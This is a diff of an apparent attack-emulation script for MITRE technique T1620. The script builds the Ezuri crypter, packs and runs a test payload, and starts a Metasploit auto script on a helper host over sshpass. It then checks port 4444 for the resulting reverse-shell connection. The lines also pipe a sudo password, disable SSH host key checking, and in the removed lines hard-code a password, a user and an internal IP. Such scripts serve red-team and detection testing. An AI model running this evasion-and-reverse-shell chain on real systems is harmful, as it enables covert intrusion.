@@ -1,20 +1,24 @@
 ;
 #pre
-cd /home/ubuntu/attack/ezuri
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install zip golang-go expect tmux sshpass) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip golang-go expect tmux sshpass))'
+cd /tmp
+unzip /tmp/ezuri.zip
+cd /tmp/ezuri
 go build -o ezuri
-sshpass -p "010404" ssh -o StrictHostKeyChecking=no grz@10.10.21.232 "cd ~/metasploit ; chmod u+x ./msf_auto.sh ; screen -dmS msf_session ./msf_auto.sh"
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% "cd ~/metasploit ; chmod u+x ./msf_auto.sh ; tmux new-session -d -s msf_session './msf_auto.sh'"
 #command
-cd /home/ubuntu/attack/ezuri
+cd /tmp/ezuri
 chmod u+x ezuri_auto.exp
 ./ezuri_auto.exp
 chmod u+x crypted_test_ezuri
-cd /home/ubuntu/attack/ezuri
 sleep 10
-screen -dmS ezuri_session ./crypted_test_ezuri
+tmux new-session -d -s T1620_session "./crypted_test_ezuri"
 #check
-sshpass -p "010404" ssh -o StrictHostKeyChecking=no grz@10.10.21.232 "lsof -i :4444"
+ps -ef | grep DE[M]ON
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% "lsof -i :4444"
 #cleanup
-cd /home/ubuntu/attack/ezuri
+rm -rf /tmp/ezuri
+rm /tmp/ezuri.zip
 demon_process_id=$(ps -ef | grep DE[M]ON | awk '{print $2}')
 kill $demon_process_id
-rm ezuri crypted_test_ezuri
+sshpass -p "%assist_password%" ssh -o StrictHostKeyChecking=no %assist_user%@%assist_hostname% "tmux kill-session -t msf_session"
